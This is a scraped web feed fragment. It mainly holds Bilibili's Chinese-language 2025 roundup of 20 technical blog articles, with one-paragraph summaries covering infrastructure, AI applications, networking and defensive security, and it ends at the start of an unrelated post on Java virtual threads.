pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>时光匆匆，【哔哩哔哩技术】公众号又与大家携手走过了充实的一年。2025年我们共精心打造了56篇原创技术文章，全方位、多角度地剖析了各类前沿技术与实用业务应用。今天，我们特别挑选出 2025 年度广受好评的 20 篇文章，汇集成这份年度精选干货，邀您一同回顾那些闪耀着智慧光芒的技术瞬间，汲取宝贵的知识养分，激发新的灵感火花！</p>
</blockquote>
<p align="center">哔哩哔哩技术精彩回顾（点击标题查看）</p>
<p align="center">👇 👇 👇</p>
<p><strong>01 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503755%26idx%3D1%26sn%3Dbd23c345d87a50bbfc833e442081843c%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503755&amp;idx=1&amp;sn=bd23c345d87a50bbfc833e442081843c&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站消息新架构升级</a></strong></p>
<p>IM系统是一个老生常谈的话题，也是融合众多有趣技术难点的地方。当技术上数据量越大，降级概率越大，但消息业务场景上数据量大的是影响力更大的UP，业务不接受技术降级，如何破？如果消息流量增加10倍，怎么保障服务不挂？本文基于以上命题，阐述了优化一个数据密集型 &gt;&gt; 计算密集型，读多写少（首页未读数）、读少写多（会话）场景兼具的系统，同时拥有热门C端产品的稳定性、扩展性和好的业务域解耦。</p>
<p><strong>02 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502600%26idx%3D1%26sn%3D578792a76a85d5179cedce71702c97ae%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502600&amp;idx=1&amp;sn=578792a76a85d5179cedce71702c97ae&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">大会员交易系统建设</a></strong></p>
<p>B站大会员交易系统，基于传统电商交易系统架构上适配虚拟物品业务，采用模块化架构，涵盖交易、订单、签约、商品、营销、清结算、规则配置等核心模块，搭载支付 SDK、风控等能力，通过事务控制、分布式锁、对账、分级业务限流等保障数据与资金安全，支撑多业务高效运转，适配个性化接入需求。</p>
<p><strong>03</strong> <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502953%26idx%3D1%26sn%3Dfe426c3e291e714f3670901c8552e4ff%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502953&amp;idx=1&amp;sn=fe426c3e291e714f3670901c8552e4ff&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">服务器故障管理实践</a></strong></p>
<p>服务器故障管理实践总结了B站在服务器规模快速扩展下，故障检测与维修自动化的探索。文章介绍了故障分类、传统人工管理的不足，以及自动化故障检测与维修方案，包括带内/带外信息采集、统一故障规则库、自动化任务流转和资产更新。通过自动化系统，提升了故障发现、定位和处理效率，实现了高覆盖率和准确率。未来将继续推进智能化监测和更高效的故障管理。</p>
<p><strong>04 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502109%26idx%3D1%26sn%3D01f3cb0332659283beec301837f962aa%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502109&amp;idx=1&amp;sn=01f3cb0332659283beec301837f962aa&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Apache Celeborn 在B站的生产实践</a></strong></p>
<p>B站完成 Apache Celeborn 大规模落地，替代 ESS 与 Push-based Shuffle，实现 Spark/Flink/MR 统一 Remote Shuffle 服务。构建元仓、HBO 智能路由、诊断治理、混沌测试、故障自愈等闭环运维体系，滚动升级与灰度发布零中断。Celeborn 承载 70% Shuffle 流量，单作业最大 200 T，日均 27 PB，显著降低 Fetch Fail 与重算，作业稳定性大幅提升；混部低优集群释放空闲资源，集群降本增效明显。后续将推进潮汐弹性、优先级 IO 调度、Remote Spill、Native 引擎集成及更多 Fallback 策略，持续与社区共建云原生中间数据服务新标准。</p>
<p><strong>05 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503622%26idx%3D1%26sn%3D0ac090fb8c352983d3c14d02e27ea3fc%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503622&amp;idx=1&amp;sn=0ac090fb8c352983d3c14d02e27ea3fc&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站游戏大模型翻译实践 —— 我们如何用LLM撑起全年百万字本地化翻译任务</a></strong></p>
<p>B站游戏自研翻译大模型体系，专为游戏本地化场景打造，覆盖 UI、技能、剧情等多类高复杂度文本。通过 RAG 检索增强、自动术语挖掘与 LLM 质检闭环，在保障角色语气与术语一致性的同时，实现翻译效率提升 7 倍、成本降低 70%+，稳定支撑 10 语种、全年百万字级本地化交付，为游戏出海提供强有力的技术支撑。</p>
<p><strong>06 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502999%26idx%3D1%26sn%3D9213bf3505748c329053a5b583450a18%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502999&amp;idx=1&amp;sn=9213bf3505748c329053a5b583450a18&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站在KMP跨平台的业务实践之路</a></strong></p>
<p>我们以一个实际业务视角，总结我们在使用 KMP 的 Share Logic 和 Share UI 两种模式在三端落地的经验与 infra 工程建设的互补，并总结了一套方便日常开发快速接入使用的框架和开发范式。</p>
<p><strong>07 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502139%26idx%3D1%26sn%3D9f5ebff5c16b76e9d06f7a2d5bd7f5c1%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502139&amp;idx=1&amp;sn=9f5ebff5c16b76e9d06f7a2d5bd7f5c1&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站搜推大规模召回系统工程实践</a></strong></p>
<p>召回作为搜索和推荐系统的首要环节，其性能直接决定了系统效果的上限。随着B站业务快速发展，搜推召回系统面临着数据规模爆炸式增长、算法策略日益复杂、时效性要求不断提高等严峻挑战。本文从工程实践角度，详细阐述了B站如何构建一套云原生、可扩展、配置化、搜推统一的大规模召回系统。希望对读者有所启发。</p>
<p><strong>08 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503308%26idx%3D1%26sn%3Dcd2dd7100bdd013c32657500d44a73c4%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503308&amp;idx=1&amp;sn=cd2dd7100bdd013c32657500d44a73c4&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站是如何实现原声视频翻译的</a></strong></p>
<p>本文聚焦B站原声视频翻译的技术革新，其核心能力在于实现中文视频向多语种的“原声风格”沉浸式转化，突破传统配音的标准化局限与字幕的认知负担，完整保留原说话人音色、情绪与节奏，且达成口型与语音的自然适配。</p>
<p>技术层面，以BILIBILI IndexTTS2模型为核心，通过感知一致性建模破解跨语言音色偏移、情绪迁移等痛点；依托RIVAL对抗式强化学习框架与Deep Search技术，保障翻译精准度、风格适配性及专有名词翻译质量；再经字幕消除与Diffusion模型驱动的唇形同步技术，实现音画协同。</p>
<p>该技术降低了内容全球化成本，推动跨语言传播从“互通”向“共鸣”升级。未来B站将拓展语言覆盖、适配多元场景，并计划开源核心模型，助力全球内容生态构建。</p>
<p><strong>09 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502635%26idx%3D1%26sn%3D4970d9c282a1ef597782bfa2bbed3a83%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502635&amp;idx=1&amp;sn=4970d9c282a1ef597782bfa2bbed3a83&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站票务抢购下单流程演进</a></strong></p>
<p>由于近年来漫展、电影等文化产业的消费力复苏，系统频繁承载高并发抢购场景（如漫展门票）。然而，热门项目库存远低于市场需求，传统架构在高并发场景下面临性能瓶颈。如何保障系统稳定性与用户体验，成为核心挑战。本文介绍了B站票务抢购下单的演进迭代过程，从实战经验中为大家整理了一些高并发场景的应对策略。</p>
<p><strong>10 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503792%26idx%3D1%26sn%3D1254ec52914112d15140a850cf692837%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503792&amp;idx=1&amp;sn=1254ec52914112d15140a850cf692837&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站社群AI智能分析系统的实践</a></strong></p>
<p>社群 AI 智能分析系统是一套完全由 AI 驱动和自动实时运行的用户反馈分析与决策系统。通过对社群反馈内容进行话题聚合与意图识别，引入群体共振、话题热度和情绪变化等指标，系统能够从大量碎片化发言中快速识别具有代表性和风险性的关键问题，并自动生成预警或工单，推动问题流转与处理闭环，提升社群治理、产品优化与运营决策效率。</p>
<p><strong>11 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502416%26idx%3D1%26sn%3D0fe22277419dd8a5f6c879470d907420%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502416&amp;idx=1&amp;sn=0fe22277419dd8a5f6c879470d907420&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站自研的第二代视频连麦系统（上）</a></strong></p>
<p>B站基于 WebRTC 重构了视频连麦系统，本文从客户端角度介绍第二代视频连麦系统如何使用标准 WebRTC API 以符合其设计的方式接入视频连麦业务，并为后续服务器端（选择性转发服务器，SFU）篇做铺垫。</p>
<p><strong>12 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502323%26idx%3D1%26sn%3D0f0f8948f0c1d62172f3eff362c5408b%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502323&amp;idx=1&amp;sn=0f0f8948f0c1d62172f3eff362c5408b&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">CIKM'24 : 更快的批量KV查询系统</a></strong></p>
<p>针对 B 站推荐场景中亿级用户与海量多模态特征带来的 Memory Wall 挑战，本文介绍了入选 CIKM '24 的高性能分布式批量 KV 查询架构。</p>
<p>本文介绍了核心自研HashTable算法 NeighborHash ，利用 Lodger Relocation（寄宿重定位）与 双向 Cacheline 感知探测，将平均内存访问次数压缩至物理极限的 1.12。结合 AMAC 异步指令流水与 SIMD 向量化加速，实现了查询吞吐的大幅提升。</p>
<p>系统架构层面，采用 NVMe + io_uring 的冷热分级存储策略与强一致性版本控制协议，以极低的成本开销支撑了海量特征吞吐。</p>
<p><strong>13 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503507%26idx%3D1%26sn%3D4e64c3e2481d267d1a0f8b487a22b477%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503507&amp;idx=1&amp;sn=4e64c3e2481d267d1a0f8b487a22b477&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">RAG在B站大会员中心数据智能平台的应用实践</a></strong></p>
<p>本文介绍 RAG 技术在 B 站大会员中心数据智能平台的应用，解决 LLM 生成 SQL 的幻觉问题，搭建完整技术架构，实现自然语言转精准 SQL，大幅提升数据查询效率，同时阐述现存挑战与后续优化方向。</p>
<p><strong>14 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502440%26idx%3D1%26sn%3D3322ad1f4f096ed809245082fa8bf4a0%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502440&amp;idx=1&amp;sn=3322ad1f4f096ed809245082fa8bf4a0&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">构建可扩展的智能体系统：工程化方法与实践(一）</a></strong></p>
<p>2024年下半年写这篇文章时，我们还在小心翼翼地探索：怎么让AI不胡说八道？怎么让它记住上下文？用LangChain还是自己写？每个选择都像在黑暗中摸索。</p>
<p>一年过去，这些"小众研究"已经变成了入门教程。Agent开发从少数人的实验，变成了大规模的工程实践。技术迭代快得让人眩晕，但回头看，当时那些看似笨拙的尝试——比如用多重验证对抗幻觉、用模块化应对不确定性——反而成了今天仍然适用的底层逻辑。</p>
<p>AI的进化速度可以很快，但工程的本质问题不会变。</p>
<p><strong>15 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503578%26idx%3D1%26sn%3D817c3ba757f9f91dbbe70977f567983d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503578&amp;idx=1&amp;sn=817c3ba757f9f91dbbe70977f567983d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">VibeCut - 智能剪辑探索与实现</a></strong></p>
<p>视频剪辑长期面临专业软件门槛高与模板工具创意受限的“两难”困境，如何填补全手动与全自动之间的鸿沟成为行业难题。本文基于WebCut平台，深入探索并实现了一款智能剪辑体——VibeCut。该系统采用创新的计划者-执行者(Orchestrator-Executor)双智能体架构，通过引入结构化的共享上下文(Shared Context)作为唯一事实源，有效解决了传统多智能体协作中的上下文丢失与错误累积问题，实现了任务规划与工具执行的解耦。在原型实践中，VibeCut利用LLM与MCP协议，成功通过了字幕调整、语义裁切及图文成片等场景考验，为下一代人机协同的智能内容创作工具提供了兼具效率与稳定性的范式。</p>
<p><strong>16 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247502230%26idx%3D1%26sn%3D76feb6f4717cedf7c7fc1aaaf16d619d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247502230&amp;idx=1&amp;sn=76feb6f4717cedf7c7fc1aaaf16d619d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">新活动平台建设历程与架构演进</a></strong></p>
<p>B站用户技术中心的活动平台是连接运营效率、用户体验和活动业务的重要基础设施。活动团队历时两年对活动平台进行了一次系统级重构，打造出了一套更现代、更高效、更智能的活动工业化生产体系。改版后，活动搭建耗时和配置问题显著减少，复杂玩法可以更低成本落地，页面性能和用户体验同步提升。本文详细阐述了整个重构过程中的设计理念、建设规划和架构思考，以及活动团队是如何解决不同阶段面临的挑战，希望能对你有点帮助～</p>
<p><strong>17 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503399%26idx%3D1%26sn%3D486abeda98f6d2faf2150b006ff6b94b%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503399&amp;idx=1&amp;sn=486abeda98f6d2faf2150b006ff6b94b&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">为什么我的 TLS 1.3 多了一个 RTT</a></strong></p>
<p>本文从一次非预期的 TSL 1.3 握手时延问题入手，通过细致的抓包分析，探究 TCP 协议细节，发现了 Nagle 算法在现代网络环境下对时延敏感应用的影响，并成功优化了握手时间。不仅提升了用户体验，也让我们对不同层级网络协议的真实交互逻辑有了更深入的理解。希望能对大家有所助益。</p>
<p><strong>18 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503093%26idx%3D1%26sn%3Daa6d0bb23c2525f9f345e6d02ec21739%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503093&amp;idx=1&amp;sn=aa6d0bb23c2525f9f345e6d02ec21739&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">前端物料库的设计</a></strong></p>
<p>随着公司前端业务快速发展，原有 cnpm 系统在物料管理、搜索和文档支持方面日显不足。本文介绍了如何基于 Nexus3 构建全新的前端物料平台，实现 npm 包、UMD 组件和 SVG 图标的统一管理。通过建立四维分类体系（终端、框架、领域、功能）提升物料可发现性，并引入外部文档嵌入、产物在线预览及 Cosmos2 示例沙盒等创新功能，有效解决了"找组件难、查文档难"的痛点，为前端物料标准化治理奠定了基础。</p>
<p><strong>19 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503693%26idx%3D1%26sn%3D3d65c30c986bc3c51f2f924b1ea5f158%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503693&amp;idx=1&amp;sn=3d65c30c986bc3c51f2f924b1ea5f158&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">B站基础安全在AI溯源方向的探索实践</a></strong></p>
<p>本文分享了B站基础安全团队在AI辅助告警溯源方面的探索实践。随着安全告警运营从人工查证演进到SOAR阶段,团队借助AI技术和MCP协议,将HIDS、蜜罐、EDR等安全产品的API转化为AI可调用的工具集,构建了"告警产生-研判降噪-机器人推送-AI溯源"的完整链路。通过蜜罐、HIDS、EDR三类真实告警案例,展示了AI自动关联堡垒机日志、资产信息、用户部门等多源数据,完成从事件追踪到责任主体定位的全链路溯源能力。显著提升了安全运营效率,实现了"人机协同+自动化溯源"的落地。</p>
<p><strong>20 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3Njc0NTgwMg%3D%3D%26mid%3D2247503025%26idx%3D1%26sn%3Df4517a23d23b938279b57a640f5fe864%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3Njc0NTgwMg==&amp;mid=2247503025&amp;idx=1&amp;sn=f4517a23d23b938279b57a640f5fe864&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">从拥塞控制算法热交换到内核错误修复</a></strong></p>
<p>最近在哔哩哔哩，我们开发了一种改进的 BBR 拥塞控制算法，需要在真实环境中进行测试。该算法本身以内核模块的形式存在，因此将其安装到服务器上不是问题。然而，在快节奏的迭代过程中，我们遇到了一系列问题，最终发现了一个内核错误。本文将带您了解我们解决问题的整个过程，从拥塞控制算法热交换到内核错误修复。</p>
<p align="center">-End-</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JVM虚拟线程：JEP 444开启Java并发编程新纪元]]></title>    <link>https://juejin.cn/post/7589897523268878346</link>    <guid>https://juejin.cn/post/7589897523268878346</guid>    <pubDate>2026-01-01T04:07:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589897523268878346" data-draft-id="7589907831198629914" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JVM虚拟线程：JEP 444开启Java并发编程新纪元"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-01T04:07:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jungly"/> <meta itemprop="url" content="https://juejin.cn/user/61228380597341"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JVM虚拟线程：JEP 444开启Java并发编程新纪元
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61228380597341/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jungly
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T04:07:25.000Z" title="Thu Jan 01 2026 04:07:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 